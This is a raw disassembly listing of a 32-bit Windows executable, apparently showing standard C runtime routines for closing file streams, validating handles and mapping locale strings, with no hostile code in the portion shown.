  40953d:	74 08                	je     0x409547
  40953f:	83 f8 fe             	cmp    $0xfffffffe,%eax
  409542:	74 03                	je     0x409547
  409544:	50                   	push   %eax
  409545:	ff d6                	call   *%esi
  409547:	a1 d0 dd 40 00       	mov    0x40ddd0,%eax
  40954c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40954f:	74 08                	je     0x409559
  409551:	83 f8 fe             	cmp    $0xfffffffe,%eax
  409554:	74 03                	je     0x409559
  409556:	50                   	push   %eax
  409557:	ff d6                	call   *%esi
  409559:	5e                   	pop    %esi
  40955a:	c3                   	ret
  40955b:	8b ff                	mov    %edi,%edi
  40955d:	55                   	push   %ebp
  40955e:	8b ec                	mov    %esp,%ebp
  409560:	53                   	push   %ebx
  409561:	56                   	push   %esi
  409562:	8b 75 08             	mov    0x8(%ebp),%esi
  409565:	57                   	push   %edi
  409566:	33 ff                	xor    %edi,%edi
  409568:	83 cb ff             	or     $0xffffffff,%ebx
  40956b:	3b f7                	cmp    %edi,%esi
  40956d:	75 1c                	jne    0x40958b
  40956f:	e8 0b 84 ff ff       	call   0x40197f
  409574:	57                   	push   %edi
  409575:	57                   	push   %edi
  409576:	57                   	push   %edi
  409577:	57                   	push   %edi
  409578:	57                   	push   %edi
  409579:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40957f:	e8 93 83 ff ff       	call   0x401917
  409584:	83 c4 14             	add    $0x14,%esp
  409587:	0b c3                	or     %ebx,%eax
  409589:	eb 42                	jmp    0x4095cd
  40958b:	f6 46 0c 83          	testb  $0x83,0xc(%esi)
  40958f:	74 37                	je     0x4095c8
  409591:	56                   	push   %esi
  409592:	e8 23 e3 ff ff       	call   0x4078ba
  409597:	56                   	push   %esi
  409598:	8b d8                	mov    %eax,%ebx
  40959a:	e8 f4 05 00 00       	call   0x409b93
  40959f:	56                   	push   %esi
  4095a0:	e8 0c a8 ff ff       	call   0x403db1
  4095a5:	50                   	push   %eax
  4095a6:	e8 1b 05 00 00       	call   0x409ac6
  4095ab:	83 c4 10             	add    $0x10,%esp
  4095ae:	85 c0                	test   %eax,%eax
  4095b0:	7d 05                	jge    0x4095b7
  4095b2:	83 cb ff             	or     $0xffffffff,%ebx
  4095b5:	eb 11                	jmp    0x4095c8
  4095b7:	8b 46 1c             	mov    0x1c(%esi),%eax
  4095ba:	3b c7                	cmp    %edi,%eax
  4095bc:	74 0a                	je     0x4095c8
  4095be:	50                   	push   %eax
  4095bf:	e8 27 b2 ff ff       	call   0x4047eb
  4095c4:	59                   	pop    %ecx
  4095c5:	89 7e 1c             	mov    %edi,0x1c(%esi)
  4095c8:	89 7e 0c             	mov    %edi,0xc(%esi)
  4095cb:	8b c3                	mov    %ebx,%eax
  4095cd:	5f                   	pop    %edi
  4095ce:	5e                   	pop    %esi
  4095cf:	5b                   	pop    %ebx
  4095d0:	5d                   	pop    %ebp
  4095d1:	c3                   	ret
  4095d2:	6a 0c                	push   $0xc
  4095d4:	68 b0 b8 40 00       	push   $0x40b8b0
  4095d9:	e8 42 99 ff ff       	call   0x402f20
  4095de:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  4095e2:	33 c0                	xor    %eax,%eax
  4095e4:	8b 75 08             	mov    0x8(%ebp),%esi
  4095e7:	33 ff                	xor    %edi,%edi
  4095e9:	3b f7                	cmp    %edi,%esi
  4095eb:	0f 95 c0             	setne  %al
  4095ee:	3b c7                	cmp    %edi,%eax
  4095f0:	75 1d                	jne    0x40960f
  4095f2:	e8 88 83 ff ff       	call   0x40197f
  4095f7:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4095fd:	57                   	push   %edi
  4095fe:	57                   	push   %edi
  4095ff:	57                   	push   %edi
  409600:	57                   	push   %edi
  409601:	57                   	push   %edi
  409602:	e8 10 83 ff ff       	call   0x401917
  409607:	83 c4 14             	add    $0x14,%esp
  40960a:	83 c8 ff             	or     $0xffffffff,%eax
  40960d:	eb 0c                	jmp    0x40961b
  40960f:	f6 46 0c 40          	testb  $0x40,0xc(%esi)
  409613:	74 0c                	je     0x409621
  409615:	89 7e 0c             	mov    %edi,0xc(%esi)
  409618:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40961b:	e8 45 99 ff ff       	call   0x402f65
  409620:	c3                   	ret
  409621:	56                   	push   %esi
  409622:	e8 ac a6 ff ff       	call   0x403cd3
  409627:	59                   	pop    %ecx
  409628:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40962b:	56                   	push   %esi
  40962c:	e8 2a ff ff ff       	call   0x40955b
  409631:	59                   	pop    %ecx
  409632:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  409635:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40963c:	e8 05 00 00 00       	call   0x409646
  409641:	eb d5                	jmp    0x409618
  409643:	8b 75 08             	mov    0x8(%ebp),%esi
  409646:	56                   	push   %esi
  409647:	e8 fa a6 ff ff       	call   0x403d46
  40964c:	59                   	pop    %ecx
  40964d:	c3                   	ret
  40964e:	6a 10                	push   $0x10
  409650:	68 d0 b8 40 00       	push   $0x40b8d0
  409655:	e8 c6 98 ff ff       	call   0x402f20
  40965a:	8b 45 08             	mov    0x8(%ebp),%eax
  40965d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  409660:	75 13                	jne    0x409675
  409662:	e8 18 83 ff ff       	call   0x40197f
  409667:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40966d:	83 c8 ff             	or     $0xffffffff,%eax
  409670:	e9 aa 00 00 00       	jmp    0x40971f
  409675:	33 db                	xor    %ebx,%ebx
  409677:	3b c3                	cmp    %ebx,%eax
  409679:	7c 08                	jl     0x409683
  40967b:	3b 05 ac f9 40 00    	cmp    0x40f9ac,%eax
  409681:	72 1a                	jb     0x40969d
  409683:	e8 f7 82 ff ff       	call   0x40197f
  409688:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40968e:	53                   	push   %ebx
  40968f:	53                   	push   %ebx
  409690:	53                   	push   %ebx
  409691:	53                   	push   %ebx
  409692:	53                   	push   %ebx
  409693:	e8 7f 82 ff ff       	call   0x401917
  409698:	83 c4 14             	add    $0x14,%esp
  40969b:	eb d0                	jmp    0x40966d
  40969d:	8b c8                	mov    %eax,%ecx
  40969f:	c1 f9 05             	sar    $0x5,%ecx
  4096a2:	8d 3c 8d c0 f9 40 00 	lea    0x40f9c0(,%ecx,4),%edi
  4096a9:	8b f0                	mov    %eax,%esi
  4096ab:	83 e6 1f             	and    $0x1f,%esi
  4096ae:	c1 e6 06             	shl    $0x6,%esi
  4096b1:	8b 0f                	mov    (%edi),%ecx
  4096b3:	0f be 4c 0e 04       	movsbl 0x4(%esi,%ecx,1),%ecx
  4096b8:	83 e1 01             	and    $0x1,%ecx
  4096bb:	74 c6                	je     0x409683
  4096bd:	50                   	push   %eax
  4096be:	e8 69 de ff ff       	call   0x40752c
  4096c3:	59                   	pop    %ecx
  4096c4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4096c7:	8b 07                	mov    (%edi),%eax
  4096c9:	f6 44 06 04 01       	testb  $0x1,0x4(%esi,%eax,1)
  4096ce:	74 31                	je     0x409701
  4096d0:	ff 75 08             	push   0x8(%ebp)
  4096d3:	e8 dd dd ff ff       	call   0x4074b5
  4096d8:	59                   	pop    %ecx
  4096d9:	50                   	push   %eax
  4096da:	ff 15 40 a0 40 00    	call   *0x40a040
  4096e0:	85 c0                	test   %eax,%eax
  4096e2:	75 0b                	jne    0x4096ef
  4096e4:	ff 15 8c a0 40 00    	call   *0x40a08c
  4096ea:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4096ed:	eb 03                	jmp    0x4096f2
  4096ef:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4096f2:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4096f5:	74 19                	je     0x409710
  4096f7:	e8 96 82 ff ff       	call   0x401992
  4096fc:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4096ff:	89 08                	mov    %ecx,(%eax)
  409701:	e8 79 82 ff ff       	call   0x40197f
  409706:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40970c:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  409710:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409717:	e8 09 00 00 00       	call   0x409725
  40971c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40971f:	e8 41 98 ff ff       	call   0x402f65
  409724:	c3                   	ret
  409725:	ff 75 08             	push   0x8(%ebp)
  409728:	e8 9f de ff ff       	call   0x4075cc
  40972d:	59                   	pop    %ecx
  40972e:	c3                   	ret
  40972f:	8b ff                	mov    %edi,%edi
  409731:	55                   	push   %ebp
  409732:	8b ec                	mov    %esp,%ebp
  409734:	83 ec 0c             	sub    $0xc,%esp
  409737:	a1 60 db 40 00       	mov    0x40db60,%eax
  40973c:	33 c5                	xor    %ebp,%eax
  40973e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409741:	6a 06                	push   $0x6
  409743:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409746:	50                   	push   %eax
  409747:	68 04 10 00 00       	push   $0x1004
  40974c:	ff 75 08             	push   0x8(%ebp)
  40974f:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  409753:	ff 15 38 a1 40 00    	call   *0x40a138
  409759:	85 c0                	test   %eax,%eax
  40975b:	75 05                	jne    0x409762
  40975d:	83 c8 ff             	or     $0xffffffff,%eax
  409760:	eb 0a                	jmp    0x40976c
  409762:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409765:	50                   	push   %eax
  409766:	e8 f1 01 00 00       	call   0x40995c
  40976b:	59                   	pop    %ecx
  40976c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40976f:	33 cd                	xor    %ebp,%ecx
  409771:	e8 79 b4 ff ff       	call   0x404bef
  409776:	c9                   	leave
  409777:	c3                   	ret
  409778:	8b ff                	mov    %edi,%edi
  40977a:	55                   	push   %ebp
  40977b:	8b ec                	mov    %esp,%ebp
  40977d:	83 ec 34             	sub    $0x34,%esp
  409780:	a1 60 db 40 00       	mov    0x40db60,%eax
  409785:	33 c5                	xor    %ebp,%eax
  409787:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40978a:	8b 45 10             	mov    0x10(%ebp),%eax
  40978d:	8b 4d 18             	mov    0x18(%ebp),%ecx
  409790:	89 45 d8             	mov    %eax,-0x28(%ebp)
  409793:	8b 45 14             	mov    0x14(%ebp),%eax
  409796:	53                   	push   %ebx
  409797:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40979a:	8b 00                	mov    (%eax),%eax
  40979c:	56                   	push   %esi
  40979d:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4097a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4097a3:	57                   	push   %edi
  4097a4:	33 ff                	xor    %edi,%edi
  4097a6:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  4097a9:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4097ac:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4097af:	3b 45 0c             	cmp    0xc(%ebp),%eax
  4097b2:	0f 84 5f 01 00 00    	je     0x409917
  4097b8:	8b 35 ec a0 40 00    	mov    0x40a0ec,%esi
  4097be:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4097c1:	51                   	push   %ecx
  4097c2:	50                   	push   %eax
  4097c3:	ff d6                	call   *%esi
  4097c5:	8b 1d 24 a1 40 00    	mov    0x40a124,%ebx
  4097cb:	85 c0                	test   %eax,%eax
  4097cd:	74 5e                	je     0x40982d
  4097cf:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  4097d3:	75 58                	jne    0x40982d
  4097d5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4097d8:	50                   	push   %eax
  4097d9:	ff 75 0c             	push   0xc(%ebp)
  4097dc:	ff d6                	call   *%esi
  4097de:	85 c0                	test   %eax,%eax
  4097e0:	74 4b                	je     0x40982d
  4097e2:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  4097e6:	75 45                	jne    0x40982d
  4097e8:	8b 75 dc             	mov    -0x24(%ebp),%esi
  4097eb:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4097f2:	83 fe ff             	cmp    $0xffffffff,%esi
  4097f5:	75 0c                	jne    0x409803
  4097f7:	ff 75 d8             	push   -0x28(%ebp)
  4097fa:	e8 91 b1 ff ff       	call   0x404990
  4097ff:	8b f0                	mov    %eax,%esi
  409801:	59                   	pop    %ecx
  409802:	46                   	inc    %esi
  409803:	3b f7                	cmp    %edi,%esi
  409805:	7e 5b                	jle    0x409862
  409807:	81 fe f0 ff ff 7f    	cmp    $0x7ffffff0,%esi
  40980d:	77 53                	ja     0x409862
  40980f:	8d 44 36 08          	lea    0x8(%esi,%esi,1),%eax
  409813:	3d 00 04 00 00       	cmp    $0x400,%eax
  409818:	77 2f                	ja     0x409849
  40981a:	e8 11 01 00 00       	call   0x409930
  40981f:	8b c4                	mov    %esp,%eax
  409821:	3b c7                	cmp    %edi,%eax
  409823:	74 38                	je     0x40985d
  409825:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  40982b:	eb 2d                	jmp    0x40985a
  40982d:	57                   	push   %edi
  40982e:	57                   	push   %edi
  40982f:	ff 75 dc             	push   -0x24(%ebp)
  409832:	ff 75 d8             	push   -0x28(%ebp)
  409835:	6a 01                	push   $0x1
  409837:	ff 75 08             	push   0x8(%ebp)
  40983a:	ff d3                	call   *%ebx
  40983c:	8b f0                	mov    %eax,%esi
  40983e:	3b f7                	cmp    %edi,%esi
  409840:	75 c3                	jne    0x409805
  409842:	33 c0                	xor    %eax,%eax
  409844:	e9 d1 00 00 00       	jmp    0x40991a
  409849:	50                   	push   %eax
  40984a:	e8 e9 eb ff ff       	call   0x408438
  40984f:	59                   	pop    %ecx
  409850:	3b c7                	cmp    %edi,%eax
  409852:	74 09                	je     0x40985d
  409854:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  40985a:	83 c0 08             	add    $0x8,%eax
  40985d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  409860:	eb 03                	jmp    0x409865
  409862:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  409865:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  409868:	74 d8                	je     0x409842
  40986a:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40986d:	50                   	push   %eax
  40986e:	57                   	push   %edi
  40986f:	ff 75 e4             	push   -0x1c(%ebp)
  409872:	e8 29 b4 ff ff       	call   0x404ca0
  409877:	83 c4 0c             	add    $0xc,%esp
  40987a:	56                   	push   %esi
  40987b:	ff 75 e4             	push   -0x1c(%ebp)
  40987e:	ff 75 dc             	push   -0x24(%ebp)
  409881:	ff 75 d8             	push   -0x28(%ebp)
  409884:	6a 01                	push   $0x1
  409886:	ff 75 08             	push   0x8(%ebp)
  409889:	ff d3                	call   *%ebx
  40988b:	85 c0                	test   %eax,%eax
  40988d:	74 7f                	je     0x40990e
  40988f:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  409892:	3b df                	cmp    %edi,%ebx
  409894:	74 1d                	je     0x4098b3
  409896:	57                   	push   %edi
  409897:	57                   	push   %edi
  409898:	ff 75 1c             	push   0x1c(%ebp)
  40989b:	53                   	push   %ebx
  40989c:	56                   	push   %esi
  40989d:	ff 75 e4             	push   -0x1c(%ebp)
  4098a0:	57                   	push   %edi
  4098a1:	ff 75 0c             	push   0xc(%ebp)
  4098a4:	ff 15 88 a0 40 00    	call   *0x40a088
  4098aa:	85 c0                	test   %eax,%eax
  4098ac:	74 60                	je     0x40990e
  4098ae:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4098b1:	eb 5b                	jmp    0x40990e
  4098b3:	8b 1d 88 a0 40 00    	mov    0x40a088,%ebx
  4098b9:	39 7d d4             	cmp    %edi,-0x2c(%ebp)
  4098bc:	75 14                	jne    0x4098d2
  4098be:	57                   	push   %edi
  4098bf:	57                   	push   %edi
  4098c0:	57                   	push   %edi
  4098c1:	57                   	push   %edi
  4098c2:	56                   	push   %esi
  4098c3:	ff 75 e4             	push   -0x1c(%ebp)
  4098c6:	57                   	push   %edi
  4098c7:	ff 75 0c             	push   0xc(%ebp)
  4098ca:	ff d3                	call   *%ebx
  4098cc:	8b f0                	mov    %eax,%esi
  4098ce:	3b f7                	cmp    %edi,%esi
  4098d0:	74 3c                	je     0x40990e
  4098d2:	56                   	push   %esi
  4098d3:	6a 01                	push   $0x1
  4098d5:	e8 05 b0 ff ff       	call   0x4048df
  4098da:	59                   	pop    %ecx
  4098db:	59                   	pop    %ecx
  4098dc:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4098df:	3b c7                	cmp    %edi,%eax
  4098e1:	74 2b                	je     0x40990e
  4098e3:	57                   	push   %edi
  4098e4:	57                   	push   %edi
  4098e5:	56                   	push   %esi
  4098e6:	50                   	push   %eax
  4098e7:	56                   	push   %esi
  4098e8:	ff 75 e4             	push   -0x1c(%ebp)
  4098eb:	57                   	push   %edi
  4098ec:	ff 75 0c             	push   0xc(%ebp)
  4098ef:	ff d3                	call   *%ebx
  4098f1:	3b c7                	cmp    %edi,%eax
  4098f3:	75 0e                	jne    0x409903
  4098f5:	ff 75 e0             	push   -0x20(%ebp)
  4098f8:	e8 ee ae ff ff       	call   0x4047eb
  4098fd:	59                   	pop    %ecx
  4098fe:	89 7d e0             	mov    %edi,-0x20(%ebp)
  409901:	eb 0b                	jmp    0x40990e
  409903:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  409907:	74 05                	je     0x40990e
  409909:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40990c:	89 01                	mov    %eax,(%ecx)
  40990e:	ff 75 e4             	push   -0x1c(%ebp)
  409911:	e8 37 e1 ff ff       	call   0x407a4d
  409916:	59                   	pop    %ecx
  409917:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40991a:	8d 65 c0             	lea    -0x40(%ebp),%esp
  40991d:	5f                   	pop    %edi
  40991e:	5e                   	pop    %esi
  40991f:	5b                   	pop    %ebx
  409920:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409923:	33 cd                	xor    %ebp,%ecx
  409925:	e8 c5 b2 ff ff       	call   0x404bef
  40992a:	c9                   	leave
  40992b:	c3                   	ret
  40992c:	cc                   	int3
  40992d:	cc                   	int3
  40992e:	cc                   	int3
  40992f:	cc                   	int3
  409930:	51                   	push   %ecx
  409931:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  409935:	2b c8                	sub    %eax,%ecx
  409937:	83 e1 0f             	and    $0xf,%ecx
  40993a:	03 c1                	add    %ecx,%eax
  40993c:	1b c9                	sbb    %ecx,%ecx
  40993e:	0b c1                	or     %ecx,%eax
  409940:	59                   	pop    %ecx
  409941:	e9 aa de ff ff       	jmp    0x4077f0
  409946:	51                   	push   %ecx
  409947:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40994b:	2b c8                	sub    %eax,%ecx
  40994d:	83 e1 07             	and    $0x7,%ecx
  409950:	03 c1                	add    %ecx,%eax
  409952:	1b c9                	sbb    %ecx,%ecx
  409954:	0b c1                	or     %ecx,%eax
  409956:	59                   	pop    %ecx
  409957:	e9 94 de ff ff       	jmp    0x4077f0
  40995c:	8b ff                	mov    %edi,%edi
  40995e:	55                   	push   %ebp
  40995f:	8b ec                	mov    %esp,%ebp
  409961:	6a 0a                	push   $0xa
  409963:	6a 00                	push   $0x0
  409965:	ff 75 08             	push   0x8(%ebp)
  409968:	e8 a8 f3 ff ff       	call   0x408d15
  40996d:	83 c4 0c             	add    $0xc,%esp
  409970:	5d                   	pop    %ebp
  409971:	c3                   	ret
  409972:	8b ff                	mov    %edi,%edi
  409974:	55                   	push   %ebp
  409975:	8b ec                	mov    %esp,%ebp
  409977:	83 ec 18             	sub    $0x18,%esp
  40997a:	53                   	push   %ebx
  40997b:	ff 75 10             	push   0x10(%ebp)
  40997e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  409981:	e8 d3 7d ff ff       	call   0x401759
  409986:	8b 5d 08             	mov    0x8(%ebp),%ebx
  409989:	8d 43 01             	lea    0x1(%ebx),%eax
  40998c:	3d 00 01 00 00       	cmp    $0x100,%eax
  409991:	77 0f                	ja     0x4099a2
  409993:	8b 45 e8             	mov    -0x18(%ebp),%eax
  409996:	8b 80 c8 00 00 00    	mov    0xc8(%eax),%eax
  40999c:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  4099a0:	eb 75                	jmp    0x409a17
  4099a2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4099a5:	c1 7d 08 08          	sarl   $0x8,0x8(%ebp)
  4099a9:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4099ac:	50                   	push   %eax
  4099ad:	8b 45 08             	mov    0x8(%ebp),%eax
  4099b0:	25 ff 00 00 00       	and    $0xff,%eax
  4099b5:	50                   	push   %eax
  4099b6:	e8 e9 b1 ff ff       	call   0x404ba4
  4099bb:	59                   	pop    %ecx
  4099bc:	59                   	pop    %ecx
  4099bd:	85 c0                	test   %eax,%eax
  4099bf:	74 12                	je     0x4099d3
  4099c1:	8a 45 08             	mov    0x8(%ebp),%al
  4099c4:	6a 02                	push   $0x2
  4099c6:	88 45 f8             	mov    %al,-0x8(%ebp)
  4099c9:	88 5d f9             	mov    %bl,-0x7(%ebp)
  4099cc:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  4099d0:	59                   	pop    %ecx
  4099d1:	eb 0a                	jmp    0x4099dd
  4099d3:	33 c9                	xor    %ecx,%ecx
  4099d5:	88 5d f8             	mov    %bl,-0x8(%ebp)
  4099d8:	c6 45 f9 00          	movb   $0x0,-0x7(%ebp)
  4099dc:	41                   	inc    %ecx
  4099dd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4099e0:	6a 01                	push   $0x1
  4099e2:	ff 70 14             	push   0x14(%eax)
  4099e5:	ff 70 04             	push   0x4(%eax)
  4099e8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4099eb:	50                   	push   %eax
  4099ec:	51                   	push   %ecx
  4099ed:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4099f0:	50                   	push   %eax
  4099f1:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4099f4:	6a 01                	push   $0x1
  4099f6:	50                   	push   %eax
  4099f7:	e8 15 e6 ff ff       	call   0x408011
  4099fc:	83 c4 20             	add    $0x20,%esp
  4099ff:	85 c0                	test   %eax,%eax
  409a01:	75 10                	jne    0x409a13
  409a03:	38 45 f4             	cmp    %al,-0xc(%ebp)
  409a06:	74 07                	je     0x409a0f
  409a08:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409a0b:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  409a0f:	33 c0                	xor    %eax,%eax
  409a11:	eb 14                	jmp    0x409a27
  409a13:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  409a17:	23 45 0c             	and    0xc(%ebp),%eax
  409a1a:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  409a1e:	74 07                	je     0x409a27
  409a20:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409a23:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  409a27:	5b                   	pop    %ebx
  409a28:	c9                   	leave
  409a29:	c3                   	ret
  409a2a:	8b ff                	mov    %edi,%edi
  409a2c:	55                   	push   %ebp
  409a2d:	8b ec                	mov    %esp,%ebp
  409a2f:	56                   	push   %esi
  409a30:	8b 75 08             	mov    0x8(%ebp),%esi
  409a33:	57                   	push   %edi
  409a34:	56                   	push   %esi
  409a35:	e8 7b da ff ff       	call   0x4074b5
  409a3a:	59                   	pop    %ecx
  409a3b:	83 f8 ff             	cmp    $0xffffffff,%eax
  409a3e:	74 50                	je     0x409a90
  409a40:	a1 c0 f9 40 00       	mov    0x40f9c0,%eax
  409a45:	83 fe 01             	cmp    $0x1,%esi
  409a48:	75 09                	jne    0x409a53
  409a4a:	f6 80 84 00 00 00 01 	testb  $0x1,0x84(%eax)
  409a51:	75 0b                	jne    0x409a5e
  409a53:	83 fe 02             	cmp    $0x2,%esi
  409a56:	75 1c                	jne    0x409a74
  409a58:	f6 40 44 01          	testb  $0x1,0x44(%eax)
  409a5c:	74 16                	je     0x409a74
  409a5e:	6a 02                	push   $0x2
  409a60:	e8 50 da ff ff       	call   0x4074b5
  409a65:	6a 01                	push   $0x1
  409a67:	8b f8                	mov    %eax,%edi
  409a69:	e8 47 da ff ff       	call   0x4074b5
  409a6e:	59                   	pop    %ecx
  409a6f:	59                   	pop    %ecx
  409a70:	3b c7                	cmp    %edi,%eax
  409a72:	74 1c                	je     0x409a90
  409a74:	56                   	push   %esi
  409a75:	e8 3b da ff ff       	call   0x4074b5
  409a7a:	59                   	pop    %ecx
  409a7b:	50                   	push   %eax
  409a7c:	ff 15 30 a0 40 00    	call   *0x40a030
  409a82:	85 c0                	test   %eax,%eax
  409a84:	75 0a                	jne    0x409a90
  409a86:	ff 15 8c a0 40 00    	call   *0x40a08c
  409a8c:	8b f8                	mov    %eax,%edi
  409a8e:	eb 02                	jmp    0x409a92
  409a90:	33 ff                	xor    %edi,%edi
  409a92:	56                   	push   %esi
  409a93:	e8 97 d9 ff ff       	call   0x40742f
  409a98:	8b c6                	mov    %esi,%eax
  409a9a:	c1 f8 05             	sar    $0x5,%eax
  409a9d:	8b 04 85 c0 f9 40 00 	mov    0x40f9c0(,%eax,4),%eax
  409aa4:	83 e6 1f             	and    $0x1f,%esi
  409aa7:	c1 e6 06             	shl    $0x6,%esi
  409aaa:	59                   	pop    %ecx
  409aab:	c6 44 30 04 00       	movb   $0x0,0x4(%eax,%esi,1)
  409ab0:	85 ff                	test   %edi,%edi
  409ab2:	74 0c                	je     0x409ac0
  409ab4:	57                   	push   %edi
  409ab5:	e8 eb 7e ff ff       	call   0x4019a5
  409aba:	59                   	pop    %ecx
  409abb:	83 c8 ff             	or     $0xffffffff,%eax
  409abe:	eb 02                	jmp    0x409ac2
  409ac0:	33 c0                	xor    %eax,%eax
  409ac2:	5f                   	pop    %edi
  409ac3:	5e                   	pop    %esi
  409ac4:	5d                   	pop    %ebp
  409ac5:	c3                   	ret
  409ac6:	6a 10                	push   $0x10
  409ac8:	68 f0 b8 40 00       	push   $0x40b8f0
  409acd:	e8 4e 94 ff ff       	call   0x402f20
  409ad2:	8b 45 08             	mov    0x8(%ebp),%eax
  409ad5:	83 f8 fe             	cmp    $0xfffffffe,%eax
  409ad8:	75 1b                	jne    0x409af5
  409ada:	e8 b3 7e ff ff       	call   0x401992
  409adf:	83 20 00             	andl   $0x0,(%eax)
  409ae2:	e8 98 7e ff ff       	call   0x40197f
  409ae7:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409aed:	83 c8 ff             	or     $0xffffffff,%eax
  409af0:	e9 8e 00 00 00       	jmp    0x409b83
  409af5:	33 ff                	xor    %edi,%edi
  409af7:	3b c7                	cmp    %edi,%eax
  409af9:	7c 08                	jl     0x409b03
  409afb:	3b 05 ac f9 40 00    	cmp    0x40f9ac,%eax
  409b01:	72 21                	jb     0x409b24
  409b03:	e8 8a 7e ff ff       	call   0x401992
  409b08:	89 38                	mov    %edi,(%eax)
  409b0a:	e8 70 7e ff ff       	call   0x40197f
  409b0f:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409b15:	57                   	push   %edi
  409b16:	57                   	push   %edi
  409b17:	57                   	push   %edi
  409b18:	57                   	push   %edi
  409b19:	57                   	push   %edi
  409b1a:	e8 f8 7d ff ff       	call   0x401917
  409b1f:	83 c4 14             	add    $0x14,%esp
  409b22:	eb c9                	jmp    0x409aed
  409b24:	8b c8                	mov    %eax,%ecx
  409b26:	c1 f9 05             	sar    $0x5,%ecx
  409b29:	8d 1c 8d c0 f9 40 00 	lea    0x40f9c0(,%ecx,4),%ebx
  409b30:	8b f0                	mov    %eax,%esi
  409b32:	83 e6 1f             	and    $0x1f,%esi
  409b35:	c1 e6 06             	shl    $0x6,%esi
  409b38:	8b 0b                	mov    (%ebx),%ecx
  409b3a:	0f be 4c 31 04       	movsbl 0x4(%ecx,%esi,1),%ecx
  409b3f:	83 e1 01             	and    $0x1,%ecx
  409b42:	74 bf                	je     0x409b03
  409b44:	50                   	push   %eax
  409b45:	e8 e2 d9 ff ff       	call   0x40752c
  409b4a:	59                   	pop    %ecx
  409b4b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  409b4e:	8b 03                	mov    (%ebx),%eax
  409b50:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  409b55:	74 0e                	je     0x409b65
  409b57:	ff 75 08             	push   0x8(%ebp)
  409b5a:	e8 cb fe ff ff       	call   0x409a2a
  409b5f:	59                   	pop    %ecx
  409b60:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  409b63:	eb 0f                	jmp    0x409b74
  409b65:	e8 15 7e ff ff       	call   0x40197f
  409b6a:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409b70:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  409b74:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409b7b:	e8 09 00 00 00       	call   0x409b89
  409b80:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  409b83:	e8 dd 93 ff ff       	call   0x402f65
  409b88:	c3                   	ret
  409b89:	ff 75 08             	push   0x8(%ebp)
  409b8c:	e8 3b da ff ff       	call   0x4075cc
  409b91:	59                   	pop    %ecx
  409b92:	c3                   	ret
